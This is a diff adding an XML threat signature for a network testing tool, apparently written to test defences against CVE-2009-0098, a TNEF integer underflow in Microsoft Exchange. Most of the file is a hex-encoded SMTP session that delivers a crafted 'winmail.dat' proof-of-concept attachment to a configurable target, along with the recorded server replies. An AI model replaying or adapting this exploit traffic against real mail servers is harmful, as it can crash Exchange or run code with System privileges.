@@ -1,0 +1,195 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Exchange TNEF PidTagRtfCompressed Integer Underflow"/>
+    <EngDesc display="true" value="There is an Integer Underflow vulnerability exists in the way Microsoft Exchange Server handles email messages. The vulnerability is a result of insufficient boundary checking when decoding the Transport Neutral Encapsulation Format (TNEF) data for a message. An attacker can exploit this vulnerability for code execution by sending a specially crafted email to an account on the target server. Any code injected using this vulnerability would be executed in the System security context. An attack targeting this vulnerability can result in the injection and execution of code. If code execution is successful, the behaviour of the target will depend on the intention of the attacker. Note that any code injected will be executed within the security context of the Exchange Server application, normally System. In the case of an unsuccessful code execution attack, or a denial of service attack, the Microsoft Exchange Information Store service will terminate. The affected service must be restarted manually to restore the functionality of the Exchange Server."/>
+    <Intent display="true">
+      <item value="Code_Execution/Integer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="IMAP/IMAPS/SMTP/SMTPS/MAPI/RPC"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Exchange_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Exchange_Server_2000&amp;2003&amp;2007"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-0098"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="4af1aa11cae99e2599aaeb44e4b40665"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633988889681083833"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1263292203" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="CZ"/>
+    <NamedVar name="SMTPdestPort" type="ImperfectControls.Port" value="null" index="DA"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="CZ"/>
+      <for index="DA"/>
+    </for>
+    <for index="E">
+      <for index="CZ"/>
+      <for index="DA"/>
+    </for>
+    <for index="G">
+      <for index="CZ"/>
+      <for index="DA"/>
+    </for>
+    <for index="H">
+      <for index="CZ"/>
+      <for index="DA"/>
+    </for>
+    <for index="I">
+      <for index="CZ"/>
+      <for index="DA"/>
+    </for>
+    <for index="J">
+      <for index="CZ"/>
+      <for index="DA"/>
+    </for>
+    <for index="K">
+      <for index="CZ"/>
+      <for index="DA"/>
+    </for>
+    <for index="L">
+      <for index="CZ"/>
+      <for index="DA"/>
+    </for>
+    <for index="M">
+      <for index="CZ"/>
+      <for index="DA"/>
+    </for>
+    <for index="N">
+      <for index="CZ"/>
+      <for index="DA"/>
+    </for>
+    <for index="O">
+      <for index="CZ"/>
+      <for index="DA"/>
+    </for>
+    <for index="CT">
+      <for index="CZ"/>
+      <for index="DA"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:8A:D9:A2" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0050" Identification="7733" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="6204" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="49137" destPort="$SMTPdestPort" SeqNumber="D0F8BC3E" AckNumber="F6D8CE8A" HeaderLength="08" WindowSize="002E" Checksum="8CB4" UrgentPointer="0000" Options="0101080AFE11CB0D00000000" Payload="45484C4F206468637037382E7672742E74656C7573652E636F6D0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="G" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:8A:D9:A2" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="005C" Identification="7735" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="61F6" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="49137" destPort="$SMTPdestPort" SeqNumber="D0F8BC5A" AckNumber="F6D8CF11" HeaderLength="08" WindowSize="0036" Checksum="23DB" UrgentPointer="0000" Options="0101080AFE11CB0E0009BBDD" Payload="4D41494C2046524F4D3A3C74657374406468637037382E7672742E74656C7573652E636F6D3E0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="I" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:8A:D9:A2" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="005A" Identification="7736" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="61F7" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="49137" destPort="$SMTPdestPort" SeqNumber="D0F8BC82" AckNumber="F6D8D054" HeaderLength="08" WindowSize="003F" Checksum="66A0" UrgentPointer="0000" Options="0101080AFE11CB0E0009BBDD" Payload="5243505420544F3A3C74657374406468637037382E7672742E74656C7573652E636F6D3E0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="K" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:8A:D9:A2" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="003A" Identification="7737" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="6216" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="49137" destPort="$SMTPdestPort" SeqNumber="D0F8BCA8" AckNumber="F6D8D087" HeaderLength="08" WindowSize="003F" Checksum="D55E" UrgentPointer="0000" Options="0101080AFE11CB0E0009BBDD" Payload="444154410D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="M" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:8A:D9:A2" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="05DC" Identification="7738" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="5C73" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="49137" destPort="$SMTPdestPort" SeqNumber="D0F8BCAE" AckNumber="F6D8D0AE" HeaderLength="08" WindowSize="003F" Checksum="C100" UrgentPointer="0000" Options="0101080AFE11CB120009BBDD" Payload="546F3A203C74657374406468637037382E7672742E74656C7573652E636F6D3E0D0A5375626A6563743A2050726F6F66206F6620436F6E636570740D0A4D6573736167652D49443A203C30303030613264346563653324633961666335363624633334306232326224406468637037382E7672742E74656C7573652E636F6D3E0D0A4D494D452D56657273696F6E3A20312E300D0A436F6E74656E742D547970653A206D756C7469706172742F6D697865643B0D0A09626F756E646172793D222D2D2D2D3D5F4E657874506172745F3030305F303030415F41434434353141312E4142414341424143220D0A582D4D61696C65723A204D6963726F736F6674204F6666696365204F75746C6F6F6B2031322E300D0A436F6E74656E742D4C616E67756167653A20656E2D75730D0A582D4D532D544E45462D436F7272656C61746F723A203030303030303030433042424246423531374236443334464131383743463643443232314544353030343031323030300D0A0D0A50726F6F66206F6620436F6E636570740D0A436F70797269676874204173737572656E742053656375726520546563686E6F6C6F676965732C20612054454C555320436F6D70616E790D0A416C6C205269676874732052657365727665642E0D0A0D0A0D0A2D2D2D2D2D2D3D5F4E657874506172745F3030305F303030415F41434434353141312E41424143414241430D0A436F6E74656E742D547970653A20746578742F706C61696E3B0D0A09636861727365743D2275732D6173636969220D0A436F6E74656E742D5472616E736665722D456E636F64696E673A20376269740D0A0D0A50726F6F66206F6620436F6E636570740D0A436F70797269676874204173737572656E742053656375726520546563686E6F6C6F676965732C20612054656C757320436F6D70616E790D0A416C6C205269676874732052657365727665642E0D0A0D0A2D2D2D2D2D2D3D5F4E657874506172745F3030305F303030415F41434434353141312E41424143414241430D0A436F6E74656E742D547970653A206170706C69636174696F6E2F6D732D746E65663B0D0A096E616D653D2277696E6D61696C2E646174220D0A436F6E74656E742D5472616E736665722D456E636F64696E673A206261736536340D0A436F6E74656E742D446973706F736974696F6E3A206174746163686D656E743B0D0A0966696C656E616D653D2277696E6D61696C2E646174220D0A0D0A654A382B49673453415161514341414541414141414141424141454141516551426741494141414135415141414141414141446F41414549674163410D0A4741414141456C515453354E61574E7962334E765A6E5167545746706243354F6233526C4144454941513241424141434141414141674143414145470D0A67414D4144674141414E6B484167414B41413041465141414141494145414542413541474143544C4141416C4141414143774143414145414141414C0D0A41434D414141414141414D414A674141414141414377417041414141414141444144594141414141414234416341414241414141427741414146526C0D0A633351674D6741414167467841414541414141574141414141636D4C72467455746B725436485A7753534B4634664B573554596D31774141416745640D0A444145414141416741414141553031555544705552564E5551455249513141334F433557556C51755645564D56564E464C6B4E505451414C4141454F0D0A414141414145414142673441546746547249764A41514942436734424141414147414141414141414141444175372B3146376254543647487A327A530D0A49653151776F414141414D41464134414141414143774166446745414141414341516B5141514141414D5048414141434141414148516342414578610D0A526E564E503748564177414B41484A6A634763784D6A55574D67443443324275446841774D7A4E50416663437041506A4167" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="O" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:8A:D9:A2" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="05DC" Identification="7739" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="5C72" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="49137" destPort="$SMTPdestPort" SeqNumber="D0F8C256" AckNumber="F6D8D0AE" HeaderLength="08" WindowSize="003F" Checksum="2A6C" UrgentPointer="0000" Options="0101080AFE11CB120009BBDD" Payload="426A614172416337426C0D0A6444416742784D436748304B674A304141436F4A73416E77424A426864415778476C494E3447674A6741485149445575674451774C6A45784C6A49550D0A414A4977416F4263646769516432734C6748526B4E4178675977425143774D4C745341414D4745354E3251784F575768446A4134596A4978466C41310D0A425847415A574A6A593251354E68656853446B35597844514D7A5541304457784678426A4F54675430426A514D774841435134674D6A6B57304749300D0A4D6D59764441454B73517141466A417A4765426B5A6842684E7A51324749426D4F54527646364157734148514675417A463641415147614B5A5276770D0A4E426B784E7A68684754414D4E32595955425A424D6D45345A413434446B4157514277414E44646A4E6F63614A426977486C41794E44566C474241420D0A4845417A4D5745784E6A5532545170675952795148394178596862774D4130427347454F4D427477596A55775A57343446374168454278514D786B670D0A47354268795346774E44676655444E6A4768555A384F3432485A4166384259775A42676747354169454C6F3346704133494A415A734264674F5259670D0A2F794477484A414245426D5149544157554358414839447647644167414347414162413048784142494232517A5263514D414467476A4D774E7739410D0A446A44694F5251424E44466B414E415763414567317874424A5141643044596B73444D677742684256794677473941624947595863445157514466460D0A474A426A4A594179597A67724553437766794E51444441614D7874774A55416738434F414D444930496B426959697941463241784F4E385877437A510D0A4B73416D414365774D5370674B5043484359416630434951595441314E513467337865514A4A457559426151474146694B4D41655A7634774C7745630D0A55427152477041644D4445414936432F4C69456551522B6748524166494377775A6833512F5348775A5238774749415A34436567462F415A384830760D0A30545157304239514B414163344234514E5930614A4749426F425A414D575533466B4439495741324A67457177686E674A48416945526C68355454410D0A4D696C774E57496967416D514C4444764C4241584542674144314178474C417377427267727A4A51494C416867426F6B4D7946414E4370672F7936780D0A4152417A6F4358414E73415955434A774A4E442F464F4132384343774837415A73435151484E416E735034354B4641505944504249654167344442670D0A475A44764F354168774344674743417A476951543043367766797351477A454245415751483141714D4433514E7634774A67416977417067485341310D0A494352774853443346724167415456774D44755148624131635278512F7A64524C504172555250514E2F416935535377475A4439514A4132477741710D0A735455674952416859432B77377A6F42474E4141304355684E687A67473741345966736A67444D674D5255674932415773426B774D6C482F436541310D0A49414551516C4130565238514B78417851503868774145414A7041716B4251414B774163304550512F793568484E4168774266774F564166554232510D0A5139442F4766417345444A514430417577426A41494F415A3050383555426941474F41596B42557A436F4244304455772F792B774B46417A73685A770D0A4C50424A415459774759442F4B444579554273785245452F73536D524E6A416138503856494552784F534137495436774B774168514358412F44426D0D0A4975556A7742794143654162635530772F776E67446A416859434B77446A4178514337414B45442F48644169634272674B78417559423267462F415A0D0A4950394E4D426B7749364168384335524E77416867446B682F794177486F557449422F414972415A38426D514864442F4674424449526951466A41620D0A55422B78463741327750" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,3,5,7,9,11">
+    <Output index="E" Count="">
+      <Ethernet srcMac="00:0C:29:8A:D9:A2" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00BB" Identification="7EB2" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="1A1A" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$SMTPdestPort" destPort="49137" SeqNumber="F6D8CE8A" AckNumber="D0F8BC5A" HeaderLength="08" WindowSize="FAD4" Checksum="7150" UrgentPointer="0000" Options="0101080A0009BBDDFE11CB0D" Payload="3232302045786368616E67652D37382E6468637037382E7672742E74656C7573652E636F6D204D6963726F736F66742045534D5450204D41494C20536572766963652C2056657273696F6E3A20362E302E333739302E3339353920726561647920617420205475652C2031302046656220323030392031353A34383A3339202D30353030200D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="H" Count="">
+      <Ethernet srcMac="00:0C:29:8A:D9:A2" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0177" Identification="7EB3" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="195D" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$SMTPdestPort" destPort="49137" SeqNumber="F6D8CF11" AckNumber="D0F8BC82" HeaderLength="08" WindowSize="FAAC" Checksum="7CF3" UrgentPointer="0000" Options="0101080A0009BBDDFE11CB0E" Payload="3235302D45786368616E67652D37382E6468637037382E7672742E74656C7573652E636F6D2048656C6C6F205B3137322E31362E312E325D0D0A3235302D5455524E0D0A3235302D53495A450D0A3235302D4554524E0D0A3235302D504950454C494E494E470D0A3235302D44534E0D0A3235302D454E48414E434544535441545553434F4445530D0A3235302D386269746D696D650D0A3235302D42494E4152594D494D450D0A3235302D4348554E4B494E470D0A3235302D565246590D0A3235302D582D4558505320475353415049204E544C4D204C4F47494E0D0A3235302D582D455850533D4C4F47494E0D0A3235302D4155544820475353415049204E544C4D204C4F47494E0D0A3235302D415554483D4C4F47494E0D0A3235302D582D4C494E4B3253544154450D0A3235302D584558434835300D0A323530204F4B0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="J" Count="">
+      <Ethernet srcMac="00:0C:29:8A:D9:A2" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0067" Identification="7EB4" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="1A6C" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$SMTPdestPort" destPort="49137" SeqNumber="F6D8D054" AckNumber="D0F8BCA8" HeaderLength="08" WindowSize="FA86" Checksum="7C29" UrgentPointer="0000" Options="0101080A0009BBDDFE11CB0E" Payload="32353020322E312E302074657374406468637037382E7672742E74656C7573652E636F6D2E2E2E2E53656E646572204F4B0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="L" Count="">
+      <Ethernet srcMac="00:0C:29:8A:D9:A2" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="005B" Identification="7EB5" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="1A77" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$SMTPdestPort" destPort="49137" SeqNumber="F6D8D087" AckNumber="D0F8BCAE" HeaderLength="08" WindowSize="FA80" Checksum="45EA" UrgentPointer="0000" Options="0101080A0009BBDDFE11CB0E" Payload="32353020322E312E352074657374406468637037382E7672742E74656C7573652E636F6D200D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="N" Count="">
+      <Ethernet srcMac="00:0C:29:8A:D9:A2" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0062" Identification="7EB6" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="1A6F" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$SMTPdestPort" destPort="49137" SeqNumber="F6D8D0AE" AckNumber="D0F8C256" HeaderLength="08" WindowSize="FAF0" Checksum="4E64" UrgentPointer="0000" Options="0101080A0009BBDDFE11CB12" Payload="333534205374617274206D61696C20696E7075743B20656E642077697468203C43524C463E2E3C43524C463E0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="CT" Count="">
+      <Ethernet srcMac="00:0C:29:8A:D9:A2" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0091" Identification="7ED8" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="1A1E" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$SMTPdestPort" destPort="49137" SeqNumber="F6D8D0DC" AckNumber="D0F9D900" HeaderLength="08" WindowSize="F96E" Checksum="4CB1" UrgentPointer="0000" Options="0101080A0009BBDDFE11CB17" Payload="32353020322E362E3020203C30303030613264346563653324633961666335363624633334306232326224406468637037382E7672742E74656C7573652E636F6D3E20517565756564206D61696C20666F722064656C69766572790D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
